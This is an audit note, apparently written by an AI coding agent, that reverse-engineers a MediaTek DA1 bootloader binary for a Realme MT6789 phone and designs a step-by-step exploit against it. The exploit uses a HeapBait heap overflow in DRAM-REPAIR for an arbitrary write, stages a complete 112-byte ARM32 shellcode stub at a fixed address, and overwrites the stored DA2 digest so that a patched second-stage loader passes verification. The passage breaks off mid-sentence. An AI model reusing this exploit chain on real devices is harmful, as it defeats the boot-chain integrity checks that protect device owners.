# DA1 (200EX01 / MT6789) — hash-patch audit

**Question.** Handoff step 4 (`docs/notes/uswi.handoff:120`) says: after DA1 code exec,
`find_da_hash_v6(da1, sig_len)` → `pos`, then write `sha256(patched_da2)` at
`da1_addr + pos`. This note audits that plan against the actual 200EX01 DA1 binary:
what exists in the repo, what the DA1 command table really contains, where/if the
DA2 digest is checked, and what the smallest executable contract for step 4 is.

- Target: `docs/notes/rmx3630-da2/da1_allinone.bin`, `0x689FC` bytes, base `0x200000`
  (`sha256 e1a4110a394db63c5e1a56e8c6e2acfe495faf0167b20f6b85aefe649a3823f2`).
- Cross-check blobs: `DA_BR.bin` (`abee43e8…a8007c`), DA1 region `[0xBC, 0x68AB8)`;
  DA2 region `[0x68AB8, 0xBFA80)`; `da2_oplus.bin` == DA2 region with the trailing
  `0x100` signature zeroed. `da1_allinone.bin` and the DA_BR DA1 region differ in
  **exactly 256 bytes**, `0x688FC..0x689FC`: zeroed in `da1_allinone.bin`, a real
  signature in `DA_BR.bin` (`[V]`, single diff run).
- Read-only audit. No code, no existing docs, no device touched. Tools:
  `/tmp/opencode/da1venv/bin/python` (capstone 5.0.7, unicorn 2.1.4),
  helper disassemblers written under `/tmp/opencode/` (`da1dis.py`, `xref.py`,
  `da1audit.py`) — **not** added to the repo.
- Every claim below carries the command that proves it.

Legend: `[V]` = verified by executing the stated command; `[I]` = inference from
disassembly, explicitly marked; `[?]` = cannot be proven offline.

---

## 0. TL;DR (details in §1–§5)

1. `patch_da_hash` / `run_da1_exploit` / `src/heapbait_sram/*` **do not exist in this
   repo**. They exist only in upstream **PR bkerler/mtkclient#414** (head
   `Xyzstk/mtkclient@ab34f32`), which is where the handoff's §5 reference points —
   the note's "PR #414 (Xyzstk/mtkclient)" is a mis-citation (§1.3).
2. DA1 200EX01 registers **exactly 12** commands. There is **no** `EXP-PATCH-MEM`,
   `WRITE-MEMORY`, `READ-MEMORY`, `CMD:CUSTOM`, `SEND-DA`/`JUMP-DA`, `DOWNLOAD-FILE`
   or `SET-HOST-INFO`→`CUSTOM` rename. **DA1 has no arbitrary-write command** (§2).
3. DA1 **does** verify SHA-256 of the DA2 upload, in `CMD:BOOT-TO` (`0x201080`),
   against a single 32-byte slot at **VA `0x2688CC` / file `0x688CC`**, over the
   bytes actually transferred to `0x40000000` (= DA2 body, signature excluded, `0x56EC8`
   for this pair). Proof is empirical: the slot equals `sha256(DA2[:0x56EC8])` (§3).
4. Therefore step 4 reduces to **one 32-byte store + one `dpc->cb` fire**; no SRAM
   agent, no `CMD:CUSTOM` in DA1. Recommended shape: stage a 112-byte stub at the
   fixed `0x40000000` via a *deliberately failing* `BOOT-TO`, fire it once, then send
   the real patched DA2 (§4.3).
5. The part of the handoff that **does not check out**: `free()` tail-calls
   `insert()` on the attacker-chosen pointer, which prepends a bogus node to the free
   list; `dpc_clear` then zeroes that node's `next`, so the *next* `malloc` dereferences
   address `8` and dies. The step-4 payload **must unlink the bogus node** before
   returning (§4.5). Nothing in the handoff mentions this.

---

## 1. Repo inventory

### 1.1 Method

```bash
cd /root/mtkclient
git ls-files | wc -l                 # 1335 tracked files
for pat in patch_da_hash find_da_hash_v6 run_da1_exploit heapbait_sram \
           patch_custom_command EXP-PATCH-MEM WRITE-MEMORY; do
  echo "--- $pat ---"; git grep -n -- "$pat" || echo "(absent)"; done
```

### 1.2 Result `[V]`

| symbol | state | evidence (path:line) |
|---|---|---|
| `patch_da_hash` | **absent in code** | only `docs/notes/uswi.handoff:5`, `:120`, `:139` (prose) |
| `run_da1_exploit` | **absent** | only `docs/notes/uswi.handoff:139` |
| `heapbait_sram` (dir / payload) | **absent** | only `docs/notes/uswi.handoff:139`; `git ls-files \| grep heapbait` → `re-heapbait-*.md`, `Library/Exploit/heapbait.py`, `payloads/heapbait_arm{,64}.bin`; no `src/heapbait_sram/`, no `payloads/heapbait_sram.bin` |
| `is_da1_vulnerable` | **absent** | `git grep` empty (only DA2 `is_vulnerable`) |
| `find_da_hash_v6` | **present** | `mtkclient/Library/DA/mtk_daloader.py:102` (def), `:94` (call from `compute_hash_pos`) |
| `find_da_hash_v5` | present | `mtkclient/Library/DA/mtk_daloader.py:109` |
| `calc_da_hash` (md5/sha1/sha256 scan) | present | `mtkclient/Library/DA/mtk_daloader.py:124` |
| `fix_hash` (the actual 32-byte write, offline) | present | `mtkclient/Library/DA/mtk_daloader.py:140` |
| `patch_custom_command` | present, **DA2-side only** | `mtkclient/Library/DA/xmlflash/extension/v6.py:72`, called `:485`, `:521` |
| `EXP-PATCH-MEM` | present, **DA2-side only** | `mtkclient/Library/Exploit/heapbait.py:574`, `:583`; `xmlflash/xml_lib.py:820`; binaries `payloads/heapbait_arm*.bin` |
| `WRITE-MEMORY` | **absent** | only `docs/notes/uswi.handoff:122` |

Two more facts that matter for the plan:

- `XmlFlashExt.patch_da1()` is a **no-op** (`v6.py:403 return _da1`) — DA1 code is never
  patched offline. Offline only the *digest* is rewritten (`fix_hash`), and that
  invalidates the preloader's RSA-PSS check over DA1. That is the whole reason a
  *runtime* `patch_da_hash` is needed.
- Host side already computes everything needed: `xml_lib.patch_da()` (`:388-410`) calls
  `compute_hash_pos(...)`, `patch_da2(da2)`, then `fix_hash(da1, da2, hashaddr, hashmode,
  hashlen)` and sets `daconfig.da2 = da2[:hashlen]`. The runtime version is the same
  arithmetic with `write_memory` instead of a bytearray slice.

### 1.3 The PR #414 reference (fetched, cited)

```bash
curl -sS https://api.github.com/repos/bkerler/mtkclient/pulls/414
# 414 "Port heapbait to da1 for oplus open"  user=Xyzstk  head=Xyzstk/mtkclient  state=open
curl -sSL -H 'Accept: application/vnd.github.v3.diff' \
     https://api.github.com/repos/bkerler/mtkclient/pulls/414 -o pr414.diff   # 44721 bytes
curl -sS https://api.github.com/repos/Xyzstk/mtkclient/commits/main
# ab34f32a34c76cd0e8bb8c16ee3f7a94a3a7b882  2026-10-21
```

> Note `[V]`: `Xyzstk/mtkclient/pulls/414` → **404**, and that repo has **0 PRs**.
> The real object is **`bkerler/mtkclient` PR #414**. `patch_da_hash`,
> `run_da1_exploit`, `is_da1_vulnerable`, `cmd_debug_dram_repair`, `cmd_read_memory`,
> `cmd_write_memory`, `cmd_execute_memory` and `src/heapbait_sram/*` appear *only in
> that diff*; they are **not** in `Xyzstk/mtkclient@main` either (only the C payload
> `src/heapbait_sram/` was later pushed there).

Exact algorithm of the two functions, quoted from the diff (`[V]`, pr414.diff
`@@ -597,6 +667,136 @@` and `@@ -614,6 +814,17 @@`):

```python
    def patch_da_hash(self, da2):
        daconfig = self.mtk.daloader.daconfig
        da1 = daconfig.da1
        da1_addr = daconfig.da_loader.region[1].m_start_addr
        da1sig_len = daconfig.da_loader.region[1].m_sig_len
        pos, hashmode = self.mtk.daloader.find_da_hash_v6(da1, da1sig_len)
        if pos == -1:
            return False
        da2_hash = hashlib.sha256(da2).digest()
        return self.write_memory(da1_addr + pos, da2_hash)   # CMD:WRITE-MEMORY in DA1

    def run_da1_exploit(self):
        if not self.is_da1_vulnerable(): return False
        dpc_addr                 = 0x2102008
        bootstrap_shellcode_addr = 0x2101F04
        read_packet_with_profile = 0x2002808
        write_packet_with_profile= 0x200276C
        shellcode_addr           = 0x20F0000
        shellcode = bytearray(self.heapbait_sram_payload)
        # stage1: CMD:DEBUG:DRAM-REPAIR, param 0x100, ack 0x100, 0x100 zeros, then "ERR"
        # stage2: CMD:DEBUG:DRAM-REPAIR, param 0x200, ack_value(0xFC),
        #         payload = 0x318 zeros + (dpc_addr-0x10) + bootstrap_shellcode_addr
        #         -> "ERR" triggers the free() fire-write
        # stage3: 0x14-byte ARM64 stub (write_packet->"OK", read_packet->SRAM, br x20)
        #         loads the SRAM agent to 0x20F0000 and jumps there
```

`is_da1_vulnerable()` (same diff):

```python
            da1 = self.mtk.daloader.daconfig.da1
            if not b'CMD:DEBUG:DRAM-REPAIR' in da1:      return False
            if b"Dest XML file name buffer overflow" in da1: return False
            return True
```

`find_da_hash_v6` in that PR is **byte-identical** to this repo's copy
(`diff` of the two files: no difference in the function) — i.e. the "search strategy"
is not a search at all, it is a fixed-layout assumption:

```python
    @staticmethod
    def find_da_hash_v6(da1, siglen):
        pos = len(da1) - siglen - 0x30
        _hash = da1[pos:pos + 0x30]
        if _hash[-4:] == b"\x00\x00\x00\x00":
            return pos, 2          # 2 == SHA-256
        return -1, -1
```

What is written where, summarised:

| item | value |
|---|---|
| search strategy | none — `pos = len(da1) - sig_len - 0x30`, validated only by a 4-byte sentinel `00 00 00 00` at `pos+0x2c` |
| `sig_len` | `region[1].m_sig_len` = `0x100` for this DA1 (proven below) |
| digest | `sha256(da2)`, 32 bytes |
| write target | `region[1].m_start_addr + pos` = `0x200000 + 0x688CC` = **`0x2688CC`** |
| mechanism | `CMD:WRITE-MEMORY` of the **SRAM agent** registered *by the payload* (`src/heapbait_sram/main.c:267-269`), not by stock DA1 |

For reference, the ARM64 agent registers
`CMD:READ-MEMORY` / `CMD:WRITE-MEMORY` / `CMD:EXECUTE-MEMORY` via
`register_major_command` (`= 0x2003564`) — that is the capability MT6789 DA1 lacks and
would have to grow. The PR's `patch_da_hash` therefore **depends on** the SRAM agent;
it is not a one-shot primitive.

---

## 2. DA1 command table

### 2.1 Registrar `0x200ED0` `[V]`

`/tmp/opencode/da1dis.py 0x200E80 0x201010`:

```
0x200ed0  push {r4, sl, fp, lr}
0x200ed8  movw r4, #0x452c ; movt r4, #0x25      ; r4 = 0x25452C ("1", the version arg)
0x200edc  movw r0, #0x452e ; movt r0, #0x25      ; 0x25452E "CMD:NOTIFY-INIT-HW"
0x200ee0  movw r2, #0x16e8 ; movt r2, #0x20      ; handler 0x2016E8
0x200ef4  bl   #0x203bbc                          ; reg_cmd(name, "1", handler)
   ... 11 more identical triples ...
0x201000  b    #0x203bbc                         ; tail call, last entry
```

`reg_cmd` = `0x203BBC` `[V]`:

```
0x203bd4  bl 0x204c2c            ; malloc(0x14)
0x203be0  r2 = 0x266070          ; list head
0x203bf4  stm r0, {r3, r6}       ; node+0 = old head, node+4 = version
0x203bf8  str r5, [r0, #8]       ; node+8  = name string
0x203bfc  str r1, [r0, #0xc]     ; node+0xc = 0
0x203c00  str r4, [r0, #0x10]    ; node+0x10 = handler
```

and the handler is invoked at `0x203FB4`: `blx r2` with `r2 = [r4+0x10]` (loaded at
`0x203FA4`), `r0 = <raw XML buffer>`, `r1 = session` — i.e. `handler(session, xml)`, matching the
`HHANDLE(channel, const char* xml)` prototype used by the PR's agent.

**All 12 registration sites** `[V]` (brute-force scan of every `BL/B` word for target
`0x203BBC`): `0x200EF4, 0x200F0C, 0x200F24, 0x200F3C, 0x200F54, 0x200F6C, 0x200F84,
0x200F9C, 0x200FB4, 0x200FCC, 0x200FE4, 0x201000`. Nothing else registers commands.

### 2.2 The table `[V]`

Names read with `strings -t x docs/notes/rmx3630-da2/da1_allinone.bin` (file offset
`0x5452E` ⇒ VA `0x25452E`); handlers decoded from the `movw/movt r2` pairs.

| # | string (VA) | handler | notes |
|---|---|---|---|
| 1 | `CMD:NOTIFY-INIT-HW` (`0x25452E`) | `0x2016E8` | |
| 2 | `CMD:SET-HOST-INFO` (`0x254541`) | `0x20173C` | **present, unrenamed** |
| 3 | `CMD:BOOT-TO` (`0x254553`) | **`0x201080`** | **loads + hashes + jumps to DA2** (§3) |
| 4 | `CMD:REBOOT` (`0x25455F`) | `0x2023B4` | |
| 5 | `CMD:GET-HW-INFO` (`0x25456A`) | `0x202868` | |
| 6 | `CMD:SET-RUNTIME-PARAMETER` (`0x25457A`) | `0x201404` | whitelist table at `0x263494` → writes `0x2DE3EC`; not arbitrary |
| 7 | `CMD:HOST-SUPPORTED-COMMANDS` (`0x254594`) | `0x202DD0` | |
| 8 | `CMD:RAM-TEST` (`0x2545B0`) | `0x202590` | |
| 9 | `CMD:DEBUG:DRAM-REPAIR` (`0x2545BD`) | **`0x202C7C`** | HeapBait entry point |
| 10 | `CMD:WRITE-FLASH` (`0x2545D3`) | `0x2017EC` | |
| 11 | `CMD:ERASE-FLASH` (`0x2545E3`) | `0x201E98` | |
| 12 | `CMD:READ-FLASH` (`0x2545F3`) | `0x201C5C` | |

### 2.3 Presence/absence, explicit `[V]`

`python3 -c 'img=open(...).read(); [print(s, s in img) for s in (...)]'`

| string | in DA1 200EX01 | consequence |
|---|---|---|
| `CMD:DEBUG:DRAM-REPAIR` | **PRESENT** (`0x2545BD`) | vuln predicate of PR #414 satisfied |
| `Dest XML file name buffer overflow` | **absent** | not the patched build |
| `EXP-PATCH-MEM` | **absent** | DA2-only, injected at runtime by heapbait |
| `WRITE-MEMORY` | **absent** | no arbitrary write |
| `READ-MEMORY` | **absent** | no read-back primitive |
| `CMD:CUSTOM` | **absent** | created only by DA2 `patch_custom_command` (rename of `SET-HOST-INFO`) |
| `SEND-DA` / `JUMP-DA` | **absent** | `BOOT-TO` is the DA2 load+jump on XML DA |
| `SET-HOST-INFO` | PRESENT | but it is the *real* host-info handler, not renamed |
| `DOWNLOAD-FILE` | **not a host command** | exists only as DA→host request: XML at `0x256689`, emitted by `fp_read_host_file 0x2500D8` and by `READ-FLASH` |
| `DRAM-REPAIR` handler `0x202C7C` | **confirmed** | `[V]` handler body at `0x202C7C` reads `da/arg/target_file` (`0x2548E1`), `da/arg/param_file` (`0x255DC1`), downloads `DRAM-PARAM` (`0x255DD3`), calls `0x2033CC(buf,len)`, `free(buf)` (`0x202D30`), then `mxmlDelete` (`0x202DC0`) |

Other `CMD:*` strings in the image (`CMD:START` `0x256318`, `CMD:END` `0x25637E`,
`CMD:UNKNOWN` `0x256419`, `CMD:UPLOAD-FILE` `0x25681E`, `CMD:PROGRESS-REPORT` `0x256950`,
`CMD:FILE-SYS-OPERATION` `0x256A23`) are protocol/DA→host messages, not registrations.

**Answer to (ii) of the brief: DA1 200EX01 has no arbitrary-write command.** The only
memory-writing surfaces are (a) the HeapBait overflow in `DRAM-REPAIR` and (b) flash
writes. This is why step 4 needs the exploit at all.

---

## 3. DA2 hash-verification surface

### 3.1 Which command loads DA2 `[V]`

`CMD:BOOT-TO` → `0x201080`. Full call graph of the handler (every `BL` in
`0x201080..0x201400`):

```
0x2010c8 -> 0x206dd4  load_str / mxmlLoadString on the command XML
0x2010e0 -> 0x201004  get_node  ("da/arg/at_address"   0x254661)
0x2010fc -> 0x201004  get_node  ("da/arg/jmp_address"  0x254673)
0x201118 -> 0x201004  get_node  ("da/arg/source_file"  0x254686)
0x20112c -> 0x205584  hex parse  (jmp_address) -> r4
0x201138 -> 0x205584  hex parse  (at_address)  -> r0
0x2011e4 -> 0x2500d8  fp_read_host_file  (transfer)
0x201240 -> 0x2059c0  memset(0x30)  digest buffer on stack
0x201254 -> 0x2522c4  SHA-256 (wrapper, see 3.3)
0x208758            mxmlDelete
```

Gate at `0x20113C`:

```
0x20113c  cmp  r4, #0x40000000
0x201140  mov  r1, #0x1000000
0x201144  cmpeq r0, #0x40000000
0x201148  str  r0, [fp, #-0x1c]      ; download destination = at_address
0x20114c  str  r1, [fp, #-0x20]      ; max length 0x1000000
0x201150  beq  0x2011c8
0x201154  ... "2nd DA address is invalid. reset." -> dpc->cb = 0x251C58
```

Both `at_address` and `jmp_address` must be exactly `0x40000000`, and `at_address`
becomes the **download destination** (it is *not* a malloc'd buffer):

```
0x2011c8  r0 = "2nd-DA" (0x2546BC); r2 = &dest (0x40000000); r3 = &len (0x1000000)
0x2011e4  bl 0x2500d8
```
```
0x250304  ldr r0,[r6]        ; dest != 0 ?
0x25033c  cmp r0, sb         ; sb = length announced by the host, must be <= 0x1000000
0x250344  str sb,[sl]        ; store length
0x25035c  ldr r0,[r6]        ; -> [sp+0x20] = 0x40000000, used as copy base (no malloc)
0x2503f8  ldr r0,[sp,#0x20]; add r0, r0, r7; blx r2   ; recv(buf + offset, packet_len)
```

So the DA2 is written **directly to VA `0x40000000`** and the hash input is
`[0x40000000, 0x40000000 + len)`. Heap is not involved on this path.

The transfer length is host-controlled and unvalidated per-chunk
(`0x2503EC ldr r0,[sp,#0x24]` = `packet_length` global `0x2DE3F8`, no `min()` against
`sb - r7`) — this is the HeapBait overflow; it is *also* the reason the host decides
exactly which bytes get hashed.

### 3.2 Compare site `[V]`

```
0x201230  add  r5, sp, #0x28        ; 0x30-byte digest buffer
0x201238  mov  r2, #0x30
0x201240  bl   0x2059c0             ; memset
0x201244  ldr  r0, [fp, #-0x1c]     ; base   = 0x40000000
0x20124c  ldr  r1, [fp, #-0x20]     ; length = host-announced
0x201250  mov  r2, r5
0x201254  bl   0x2522c4             ; sha256(base,len,buf,&outlen)
0x20125c  cmp  r0, #0
0x201270  "hash calculation fail. (0x%x)"
0x201280  ldr  r0, [fp, #-0x24]     ; outlen
0x201288  beq  0x2012b4
0x20128c  movw r6, #0x88cc
0x201294  movt r6, #0x26            ; r6 = 0x2688CC   <-- expected digest
0x201298  ldrb r2, [r5, r1]         ; computed[i]
0x20129c  ldrb r3, [r6, r1]         ; expected[i]
0x2012a0  cmp  r3, r2
0x2012a4  bne  0x201338             ; "DA Hash mismatch."
0x2012a8  add  r1, r1, #1
0x2012ac  cmp  r1, r0
0x2012b0  blo  0x201298
0x2012b4  ... "DA hash validation OK"
```

### 3.3 The hash function is SHA-256 with a fixed 32-byte output `[V]`

```
0x2522c4  push {r4,sl,fp,lr}
0x2522cc  mov  r4, r3          ; &outlen
0x2522d0  bl   0x252e94        ; -> b 0x2530d0 (init/update/final wrapper)
0x2522d4  mov  r1, #0x20
0x2522d8  str  r1, [r4]        ; *outlen = 0x20  <-- always 32 bytes
```

`0x2530d0` → `0x252ef4` (init) / `0x252f64` (update) / `0x253078` (final). The
SHA-256 initial-state words are present in `.data` (`0x265FC4 = 0x6a09e667`), `[V]`.
The literal SHA-256 `K` table was not found as an aligned table — the initialiser
(`0x252ef4`) writes DRAM-crypto registers, so the round function is likely HW-assisted;
the empirical digest match in 3.5 settles the algorithm regardless.

### 3.4 Expected-digest storage, precisely `[V]`

| field | value |
|---|---|
| VA | **`0x2688CC`** |
| file offset | **`0x688CC`** |
| length | **`0x20`** (compare uses `outlen` = `0x20`) |
| slot | `0x30` bytes: 32-byte digest + 16 zero bytes (`0x688CC..0x688FC`) |
| DA1 signature | `0x688FC..0x689FC`, `sig_len = 0x100` — **zeroed** in `da1_allinone.bin`, real in `DA_BR.bin`; the digest at `0x688CC` is identical in both |
| writer (init, dead) | `0x200930`: `[0x2688C8] = 0x2688CC`; the pointer global `0x2688C8` is **never read** (`[V]`: no `movw/movt` or literal produces `0x2688C8` except `0x20093C`, and the store at `0x200958` is the only access) |
| only consumer | the compare above — `movw/movt → 0x2688CC` occurs exactly twice in the image: `0x200940` (init store, into the dead pointer) and `0x20128C` (compare) `[V]` |

Layout corroborates `find_da_hash_v6` exactly: `len(da1) - 0x100 - 0x30 = 0x688CC`, and
the trailing 4 bytes of the 0x30 slot are `00 00 00 00` (sentinel) → `(pos, 2)`.

```
$ /tmp/opencode/da1venv/bin/python - <<'EOF'
src = open("mtkclient/Library/DA/mtk_daloader.py").read()
ns = {}
exec(compile("\n".join(l[4:] for l in src.splitlines()[101:107]), "<v6>", "exec"), ns)
da1 = open("docs/notes/rmx3630-da2/da1_allinone.bin","rb").read()
print(ns["find_da_hash_v6"](da1, 0x100))
EOF
(428236, 2)                      # 428236 == 0x688CC  -> (pos, hashmode=SHA-256)
```

### 3.5 What buffer is hashed — empirical proof `[V]`

`/tmp/opencode/da1audit.py`:

```
== da2[:-0x100] (0x56ec8)
   sha256 = 2fd2433539b7621a0c2cab14388e4a9dfad3abd9979f195763c94af075ee7b75
   -> found in DA1 at file offset 0x688cc   (== VA 0x2688CC)
== da2 full (0x56fc8)
   sha256 = 8f99fb3ef27b6239a3962ae91e407268ff504edb8855ef51bab1c93815e0ceb0
   -> NOT in DA1
== md5(da2[:-0x100]), sha1(da2[:-0x100])
   -> NOT in DA1
```

So (a) the algorithm is SHA-256, not MD5/SHA-1; (b) the compared buffer **excludes the
`0x100`-byte DA2 signature block**; (c) the digest is over the *bytes transferred*
(`len` from the host), i.e. the raw DA2 container body — not a header, not a payload
slice carved out by DA1. `da2_oplus.bin` is exactly that region with the signature
zeroed, and its body is byte-identical to the signed copy:
`set(da2_oplus.bin[-0x100:]) == {0}`, `da2_oplus[:-0x100] == da2_region[:-0x100]` `[V]`.

`mtkclient` already sends exactly this slice: `xml_lib.patch_da()` sets
`daconfig.da2 = da2[:hashlen]` with `hashlen = len(da2) - da2sig_len` (`:403`), and
`boot_to()` sends `len(data)` (`:776`). Hence `0x56EC8` for this pair.

### 3.6 Is there any *other* DA2-integrity gate? `[V]`

- No asymmetric verification on this path: the handler's complete call graph (§3.1)
  contains no RSA/PSS/verify function — only `mxml`, `hex parse`, `download`, `memset`,
  `sha256`, logging, `mxmlDelete`.
- The check runs **only** in `BOOT-TO`. `0x2688CC` has exactly one reader, and
  `0x2688C8` is write-only. So no re-verification per command, and none after the jump.
- `hash_binding:%d, img_auth_required:%d` (`0x25498B`) and `Security deny for [%s]`
  (`0x2549B2`) belong to the *flash policy* layer, not to `BOOT-TO`.
- DA1 registers no SLA/DAA command at all (§2.2). The DAA/SLA gate for this device is
  upstream of DA1 (preloader), not in the DA2 load path.

### 3.7 Success/failure semantics of `BOOT-TO` `[V]`

Success (`0x2012CC..0x201334`):

```
0x2012cc  ip = 0x2DE180 ; str r1 (=0xFE4A4D42 magic), [ip]
0x201300  ldm r2(=0x2DE5FC), {r0,r1,r3,r5,r6,r7} ; stm ip+8
0x201308..0x201324  copy 2x5 words from 0x2DE3E4 into ip+0x20 / ip+0x30 (DA2 boot context)
0x201328  r0 = 0x2DF7A0
0x201330  stmib r0, {r1=0x40000000, ip}   ; dpc->cb = 0x40000000, dpc->arg = 0x2DE180
0x201334  b 0x2011bc                      ; return 0
```

Mismatch (`0x201338`): dumps `H1C:`/`H2C:` (`0x25471B`, `0x25474B`), logs
`DA Hash mismatch.` (`0x25477B`), returns **`0xC0070004`**, and **does not touch the
`dpc` struct** — a failed hash is side-effect free. That property is what §4.3 exploits,
and it is also a free on-device oracle.

---

## 4. Implementation contract for step 4

### 4.1 Ground truth used

| primitive | address | proof |
|---|---|---|
| `dpc` struct | `0x2DF7A0` | `0x201058: movw r0,#0xf7a0 / movt r0,#0x2d` |
| `dpc->cb` / `dpc->arg` | `+4` / `+8` | `0x2040C8 ldr r4,[r0,#4]`, `0x2040D0 ldr r0,[r0,#8]` |
| fire site | `0x2040D4 blx r4` | after `0x20409C..0x2040A8` (`cb != 0`) |
| fire ordering | same loop iteration, **after** the handler returns | `0x203FB4` handler call → `0x204038` response → `0x20409C` cb check |
| `dpc_clear` | `0x201064`, called from `0x204110` | zaps `+0,+4,+8`; single-shot |
| `free()` | `0x204380`; core `0x2043C8`; **fire-write `0x2043CC str r1,[r0,#8]`** | `ldmdb r4,{r0,r1}` ⇒ `*(r0+8) = r1` |
| `insert()` | `0x2043D8`; sentinel `0x2DF7D8`; `head+0xc` = sentinel->next | `0x2043EC ldr r1,[ip,#0xc]`, walk via `+4` |
| malloc | `0x2041E8`; `malloc(size)` = `0x204C2C`; chunk hdr `{magic@-0xc, node@-8, size@-4}`; user = node+`0xc` | `0x204304 stmdb r0,{r1,r2,r3}` |
| heap | `0x2E8000`, `0x10000` (64 KiB), `heap_init 0x2044C8` | `movw r0,#0x8000; movt r0,#0x2e` … `movt r3,#0x2f` |
| DA2 staging area | `0x40000000` fixed, `len <= 0x1000000` | §3.1 |
| payload data | `0x2688CC` (32 B) | §3.4 |

`0x2043CC` semantics, spelled out: `free(user_ptr)` reads `r0 = [ptr-8]` (the chunk/node
base) and `r1 = [ptr-4]` (chunk size), then stores `r1` at `r0+8`. If an overflow from
the *preceding* chunk rewrites the next chunk's `[-8]`/`[-4]`, this becomes
**one arbitrary 32-bit store**: `*(A+8) = V` for attacker-chosen `A`,`V`.

### 4.2 (a) Writing the 32 bytes at `da1_va + hash_off`

Payload = 20 ARM32 instructions (80 B) + 32 data bytes = 112 B, ABI-safe (uses only
`r0,r1,r2,r3,r12,lr`), position-independent, and it repairs the free list (§4.5):

```asm
        ; --- patch the expected DA2 digest in DA1 RAM ---
        movw    r12, #0x88CC
        movt    r12, #0x26            ; r12 = 0x2688CC (VA of digest)
        adr     r3,  digest           ; pc-relative, ±4095
        ldm     r3!, {r0, r1}
        stm     r12!, {r0, r1}
        ldm     r3!, {r0, r1}
        stm     r12!, {r0, r1}
        ldm     r3!, {r0, r1}
        stm     r12!, {r0, r1}
        ldm     r3!, {r0, r1}
        stm     r12!, {r0, r1}        ; 0x2688CC..0x2688EC = sha256(patched body)
        ; --- unlink the bogus free-list node created by the fire (see 4.5) ---
        movw    r2, #0xF79C
        movt    r2, #0x2D             ; r2 = 0x2DF79C = fake node
        ldr     r0, [r2]              ; prev
        ldr     r1, [r2, #4]          ; next
        cmp     r1, #0
        beq     skip
        str     r1, [r0, #4]          ; prev->next = next
        str     r0, [r1]              ; next->prev = prev
skip:   bx      lr                    ; return to cmd_loop 0x2040D8
digest: .word  D0, D1, D2, D3, D4, D5, D6, D7
```

`D0..D7` = `sha256(patched_da2_body)` computed host-side **before** the exploit
(`hashlib.sha256(da2[:0x56EC8]).digest()`, little-endian words). No SRAM, no
relocation, no `CMD:WRITE-MEMORY`, no daemon.

### 4.3 Recommended staging: `BOOT-TO` as a fixed-address loader

`BOOT-TO` writes attacker bytes to the **fixed** `0x40000000` before hashing them, and
a hash mismatch is side-effect free (§3.1, §3.7). So the payload needs no known heap
address at all:

1. `CMD:BOOT-TO` #1 with `at_address = jmp_address = 0x40000000` and
   `source_file` = the 112-byte stub. Result: `0xC0070004` (`DA Hash mismatch`), stub is
   now at `0x40000000`, `dpc` untouched.
2. `CMD:DEBUG:DRAM-REPAIR` HeapBait: overflow a chunk header with
   `[-8] = 0x2DF79C`, `[-4] = 0x40000000`, then let that chunk be freed
   (`free()` → `str r1,[r0,#8]` ⇒ `dpc->cb = 0x40000000`).
3. Handler returns → `cmd_loop` sees `cb != 0` → `0x2040D4 blx r4` with `r0 = [dpc+8]`
   → stub runs from DRAM, writes `0x2688CC..0x2688EB`, unlinks the bogus node,
   `bx lr` → `0x2040D8`; `dpc_clear` at `0x204110` disarms.
4. `CMD:BOOT-TO` #2 with the **patched** DA2 body (`0x56EC8` B, same length). The digest
   now matches → `DA hash validation OK` → `dpc->cb = 0x40000000`,
   `dpc->arg = 0x2DE180` → DA1 natively enters patched DA2 (`CMD:CUSTOM` etc.).

Why this is the *smallest viable* version:

- no need to know the malloc'd chunk address (the handoff's §4.3 "bootstrap stub under
  64 KiB heap" problem disappears);
- `0x40000000` is provably executable by DA1's own design (it `bl`s there for DA2);
- the payload is data-only after that: the digest write is a **data** store, so no
  I-cache clean/invalidate is needed for `0x2688CC` (contrast: the PR's SRAM agent
  executes freshly written *code*, which needs cache maintenance on ARM32);
- `0x2688CC` is 4-byte aligned (`0x688CC % 4 == 0`), so `ldm`/`stm` are legal.

Cost: two `BOOT-TO` round trips and one HeapBait. `BOOT-TO` #1 leaves the host with an
error result — the Python side must accept `0xC0070004` instead of aborting.

### 4.4 (b) Surviving `mxmlDelete` / `free` — exact ordering inside `DRAM-REPAIR` `[V]`

```
0x202d0c  bl 0x2500d8        ; download -> malloc(len+4) @0x250318 (heap) or fixed dest
0x202d24  bl 0x2033cc        ; validate DRAM param block
0x202d30  bl 0x25044c        ; free(param_buf)   <-- fire happens here (this chunk's next)
0x202d60..0x202d80           ; build/send "DRAM Repair" result XML
0x202dc0  bl 0x208758        ; mxmlDelete(tree) -> many free()+insert() calls
0x202dc8  ... epilogue       ; return to cmd_loop
0x20409c  cb check           ; <-- fire point (after everything above)
```

Consequences:

- The fire must be triggered by freeing a chunk **whose header we overwrote**. In the
  emulator's current geometry the overflow lands in the *free remainder*, so no `free()`
  consumes it (handoff §3 log: `free-list first node = 0x2E9710 (remainder)`) — that is
  exactly why `dpc->cb` stayed 0. The §4.1 sweep must therefore look for an `L` where
  the chunk **after** the downloaded buffer is an **allocated XML node** that
  `mxmlDelete` frees.
- If the fire triggers at `0x202D30` (`free(param_buf)`), `mxmlDelete` runs *afterwards*
  and only performs `free`/`insert` — it never allocates, so payload bytes sitting in a
  just-freed chunk survive. Any `malloc` between the fire and `0x20409C` would reuse that
  chunk; there is none (the response is `snprintf`'d into the `cmd_loop` stack frame).
- With the recommended staging (§4.3) none of this matters for the payload: it lives at
  `0x40000000`, outside the heap. Only the free list still needs repair (§4.5).

### 4.5 Nothing in the handoff covers this: `free()` corrupts the free list

`free()` ends with `b 0x2043D8`, i.e. `insert(r0)` where `r0 = [ptr-8]` — with a forged
header this is `insert(0x2DF79C)`, the *bogus* node. `insert` walks to the first node
`H` (`H > 0x2DF79C`) and executes `0x20441C`:

```
0x20441c  r3 = [r1]            ; H->prev (= sentinel 0x2DF7D8)
0x204420  str r3, [r0]         ; [0x2DF79C] = sentinel
0x204424  r3 = [r1]
0x204428  str r1, [r0, #4]     ; [0x2DF7A0] = H      (dpc+0, harmless)
0x20442c  str r0, [r1]         ; H->prev = 0x2DF79C
0x204430  str r0, [r3, #4]     ; sentinel->next = 0x2DF79C
```

`dpc->cb` at `0x2DF7A4` is *read* as the bogus node's `size` (`0x20448c ldr r0,[r2,#8]`)
but never written — so the fire survives `insert`.

What does **not** survive: right after the payload returns, `dpc_clear` (`0x201064`)
zeroes `0x2DF7A0..0x2DF7A8`, which is precisely the bogus node's `{prev,next,size}`.
The free list now reads `sentinel -> 0x2DF79C -> 0`, so the **next `malloc` does
`ldr r5,[r2,#8]` with `r2 = 0`** → data abort at address `8`. Since `BOOT-TO` #2 begins
